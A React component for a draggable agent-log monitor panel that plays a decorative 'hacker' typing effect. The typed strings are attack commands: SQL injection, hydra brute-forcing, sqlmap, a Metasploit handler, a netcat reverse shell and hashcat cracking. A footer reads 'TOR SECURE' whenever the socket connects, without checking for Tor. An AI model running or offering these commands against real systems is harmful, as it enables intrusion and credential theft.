import React, { useEffect, useState, useRef, useCallback } from 'react';
import { io } from 'socket.io-client';
import { Terminal, Activity, Cpu, Shield, RotateCcw, Code, Zap, GripVertical, Brain } from 'lucide-react';
import { WS_URL } from './config';

// Code snippets pour l'effet Matrix/Hacker
const CODE_SNIPPETS = [
    { lang: 'bash', code: 'nmap -sS -sV -O 192.168.1.0/24 --script vuln' },
    { lang: 'python', code: 'import socket; s = socket.socket(socket.AF_INET, SOCK_STREAM)' },
    { lang: 'sql', code: "SELECT * FROM users WHERE id=1 OR '1'='1'--" },
    { lang: 'bash', code: 'gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt' },
    { lang: 'bash', code: 'hydra -l admin -P rockyou.txt ssh://10.0.0.1' },
    { lang: 'python', code: 'hashlib.sha256(password.encode()).hexdigest()' },
    { lang: 'bash', code: 'sqlmap -u "http://target?id=1" --dbs --batch' },
    { lang: 'js', code: 'fetch("/api/data").then(r => r.json())' },
    { lang: 'bash', code: 'responder -I eth0 -wrf' },
    { lang: 'python', code: 'requests.get(url, verify=False, proxies={"http": "127.0.0.1:8080"})' },
    { lang: 'bash', code: 'theHarvester -d target.com -b google,linkedin' },
    { lang: 'bash', code: 'aircrack-ng -w wordlist.txt capture-01.cap' },
    { lang: 'bash', code: 'msfconsole -x "use exploit/multi/handler; set LHOST 0.0.0.0"' },
    { lang: 'python', code: 'subprocess.run(["nc", "-e", "/bin/sh", IP, PORT])' },
    { lang: 'bash', code: 'bloodhound-python -d domain.local -u user -p pass -c All' },
    { lang: 'bash', code: 'crackmapexec smb 10.0.0.0/24 -u user -p pass --shares' },
    { lang: 'bash', code: 'enum4linux -a 10.0.0.1' },
    { lang: 'bash', code: 'nikto -h http://target -Tuning x' },
    { lang: 'js', code: 'document.cookie = "session=" + btoa(payload)' },
    { lang: 'bash', code: 'hashcat -m 1000 ntlm.txt rockyou.txt -r rules/best64.rule' },
];

const SYSTEM_MESSAGES = [
    "Scanning neural pathways...",
    "Analyzing attack vectors...",
    "Loading exploit modules...",
    "Syncing with Ollama...",
    "Monitoring network traffic...",
    "Parsing response headers...",
    "Checking vulnerability database...",
    "Updating threat signatures...",
    "Establishing secure tunnel...",
    "Processing OSINT data...",
    "Training agent models...",
    "Decrypting communications...",
    "Mapping attack surface...",
    "Correlating threat intel...",
];

const AgentMonitor = () => {
    const [logs, setLogs] = useState([]);
    const [status, setStatus] = useState("Idle");
    const [currentSnippet, setCurrentSnippet] = useState(CODE_SNIPPETS[0]);
    const [typedCode, setTypedCode] = useState('');
    const logsEndRef = useRef(null);
    const socketRef = useRef(null);
    const monitorRef = useRef(null);

    // Draggable state
    const [position, setPosition] = useState({ x: null, y: null });
    const [isDragging, setIsDragging] = useState(false);
    const dragOffset = useRef({ x: 0, y: 0 });

    // Tor Security State
    const [torStatus, setTorStatus] = useState({
        connected: false,
        ip: null,
        usingTor: false,
        circuitChanges: 0,
        lastCheck: null
    });

    const addLog = useCallback((type, message) => {
        setLogs(prev => {
            const newLog = {
                id: Date.now() + Math.random().toString(36).substr(2, 9),
                type,
                message,
                timestamp: new Date()
            };
            return [...prev.slice(-50), newLog];
        });
    }, []);

    const handleReset = (e) => {
        e.stopPropagation();
        setLogs([]);
        setStatus("Idle");
        addLog('SYSTEM', 'Monitor reset.');
    };

    // Auto-scroll to bottom of logs
    useEffect(() => {
        // Use requestAnimationFrame to ensure DOM is stable before scrolling
        const scrollToBottom = () => {
            if (logsEndRef.current && document.body.contains(logsEndRef.current)) {
                logsEndRef.current.scrollIntoView({ behavior: 'auto', block: 'end' });
            }
        };
        const frameId = requestAnimationFrame(scrollToBottom);
        return () => cancelAnimationFrame(frameId);
    }, [logs]);

    // Socket Connection
    useEffect(() => {
        const socket = io(WS_URL);
        socketRef.current = socket;

        socket.on('connect', () => {
            setTorStatus(prev => ({ ...prev, connected: true }));
            addLog('SYSTEM', 'Secure uplink established.');
            setStatus('Active');
        });

        socket.on('disconnect', () => {
            setTorStatus(prev => ({ ...prev, connected: false }));
            addLog('SYSTEM', 'Uplink lost.');
            setStatus('Offline');
        });

        // Listen for agent/system logs
        socket.on('log', (data) => {
            const type = data.type || 'INFO';
            const msg = data.message || (typeof data === 'string' ? data : JSON.stringify(data));
            addLog(type, msg);
        });

        // Listen for internal CustomEvents (Local Logs)
        const handleLocalLog = (e) => {
            const { type, message } = e.detail;
            addLog(type || 'LOCAL', message);
        };
        window.addEventListener('agent-log', handleLocalLog);

        // Listen for training commentary events
        socket.on('training:commentary', (data) => {
            addLog('TRAINING', `Model ${data.model}: Score ${data.score}/100 - ${data.commentary?.substring(0, 80)}...`);
        });

        // Listen for benchmark events
        socket.on('training:benchmark', (data) => {
            addLog('BENCHMARK', `${data.model} benchmark complete: ${data.score}/100`);
        });

        // Listen for model metrics updates
        socket.on('metrics:update', (data) => {
            if (data.model && data.category) {
                addLog('METRICS', `${data.model} +${data.improvement || 0}% in ${data.category}`);
            }
        });

        return () => {
            if (socketRef.current) socketRef.current.disconnect();
            window.removeEventListener('agent-log', handleLocalLog);
        };
    }, [addLog]);

    // Matrix Typing Effect
    useEffect(() => {
        if (!currentSnippet) return;
        let i = 0;
        const speed = 50;

        const typeInterval = setInterval(() => {
            setTypedCode(currentSnippet.code.substring(0, i));
            i++;
            if (i > currentSnippet.code.length) {
                clearInterval(typeInterval);
                setTimeout(() => {
                    const next = CODE_SNIPPETS[Math.floor(Math.random() * CODE_SNIPPETS.length)];
                    setCurrentSnippet(next);
                    setTypedCode('');
                }, 2000);
            }
        }, speed);

        return () => clearInterval(typeInterval);
    }, [currentSnippet]);

    // =====================
    // DRAGGABLE FUNCTIONALITY
    // =====================
    const handleMouseDown = (e) => {
        if (e.target.closest('.no-drag')) return;

        e.preventDefault();
        setIsDragging(true);

        const rect = monitorRef.current?.getBoundingClientRect();
        if (rect) {
            dragOffset.current = {
                x: e.clientX - rect.left,
                y: e.clientY - rect.top
            };
        }
    };

    useEffect(() => {
        const handleMouseMove = (e) => {
            if (!isDragging || !monitorRef.current) return;

            const monitorWidth = monitorRef.current.offsetWidth;
            const monitorHeight = monitorRef.current.offsetHeight;

            // Calculate new position
            let newX = e.clientX - dragOffset.current.x;
            let newY = e.clientY - dragOffset.current.y;

            // Constrain to viewport
            const maxX = window.innerWidth - monitorWidth;
            const maxY = window.innerHeight - monitorHeight;

            newX = Math.max(0, Math.min(newX, maxX));
            newY = Math.max(0, Math.min(newY, maxY));

            setPosition({ x: newX, y: newY });
        };

        const handleMouseUp = () => {
            setIsDragging(false);
        };

        if (isDragging) {
            document.addEventListener('mousemove', handleMouseMove);
            document.addEventListener('mouseup', handleMouseUp);
        }

        return () => {
            document.removeEventListener('mousemove', handleMouseMove);
            document.removeEventListener('mouseup', handleMouseUp);
        };
    }, [isDragging]);

    // Calculate style based on position
    const positionStyle = position.x !== null && position.y !== null
        ? { left: position.x, top: position.y, right: 'auto', bottom: 'auto' }
        : { right: 16, bottom: 16 };

    return (
        <div
            ref={monitorRef}
            className={`fixed w-96 bg-black/90 border border-green-500/30 rounded-lg shadow-2xl backdrop-blur-sm flex flex-col z-[9999] font-mono text-xs overflow-hidden ${isDragging ? 'cursor-grabbing' : 'cursor-grab'}`}
            style={positionStyle}
        >
            {/* Header - Draggable handle */}
            <div
                className="flex justify-between items-center p-2 border-b border-green-900/50 bg-green-900/10 select-none"
                onMouseDown={handleMouseDown}
            >
                <div className="flex items-center gap-2 text-green-500">
                    <GripVertical size={14} className="opacity-50" />
                    <Terminal size={14} />
                    <span className="font-bold tracking-wider">AGENT_MONITOR</span>
                </div>
                <div className="flex items-center gap-2 no-drag">
                    <span className="text-[10px] text-gray-500">{status}</span>
                    <RotateCcw size={12} className="text-gray-500 hover:text-white cursor-pointer" onClick={handleReset} />
                </div>
            </div>

            {/* Code Rain Snippet Area */}
            <div className="bg-black/80 p-2 text-green-600/80 border-b border-green-900/30 whitespace-nowrap overflow-hidden text-[10px] h-8 flex items-center">
                <Code size={10} className="mr-2 opacity-50" />
                <span key="typed-code">{typedCode}</span><span key="cursor" className="animate-pulse">_</span>
            </div>

            {/* Logs Area */}
            <div className="h-40 overflow-y-auto p-2 space-y-1 scrollbar-thin scrollbar-thumb-cyan-900 no-drag" onMouseDown={(e) => e.stopPropagation()}>
                {logs.length === 0 ? (
                    <div className="text-gray-600 text-center py-4">
                        <Terminal size={20} className="mx-auto mb-2 opacity-50" />
                        <span>Waiting for activity...</span>
                    </div>
                ) : (
                    logs.map((log) => (
                        <div key={log.id} className="flex gap-2 text-gray-300">
                            <span className="text-gray-600 shrink-0">[{log.timestamp.toLocaleTimeString().split(' ')[0]}]</span>
                            <span className={`font-bold shrink-0 ${log.type === 'SYSTEM' ? 'text-green-500' :
                                log.type === 'AGENT' ? 'text-blue-400' :
                                    log.type === 'TOOL' ? 'text-yellow-400' :
                                        log.type === 'EXPERT' ? 'text-purple-400' :
                                            log.type === 'THOUGHT' ? 'text-cyan-400' :
                                                log.type === 'TRAINING' ? 'text-pink-400' :
                                                    log.type === 'BENCHMARK' ? 'text-orange-400' :
                                                        log.type === 'METRICS' ? 'text-indigo-400' :
                                                            'text-gray-400'
                                }`}>
                                {log.type}:
                            </span>
                            <span className="break-words text-gray-300">{log.message}</span>
                        </div>
                    ))
                )}
                <div ref={logsEndRef} />
            </div>

            {/* Footer */}
            <div
                className="bg-gray-900/80 p-1.5 text-[10px] text-gray-500 border-t border-gray-800 flex justify-between items-center select-none"
                onMouseDown={handleMouseDown}
            >
                <span className="flex items-center gap-1">
                    <Shield size={10} className={torStatus.connected ? 'text-green-500' : 'text-yellow-500'} />
                    {torStatus.connected ? 'TOR SECURE' : 'DIRECT'}
                </span>
                <span className="flex items-center gap-1">
                    <Brain size={10} className="text-pink-400" />
                    <span className="text-pink-400">TRAINING</span>
                </span>
                <span className="flex items-center gap-1 text-cyan-500">
                    <Terminal size={10} />
                    {logs.length} logs
                </span>
                <span className={`flex items-center gap-1 ${status !== 'Idle' ? 'text-green-400 animate-pulse' : ''}`}>
                    <Activity size={10} />
                    LIVE
                </span>
            </div>
        </div>
    );
};

export default AgentMonitor;
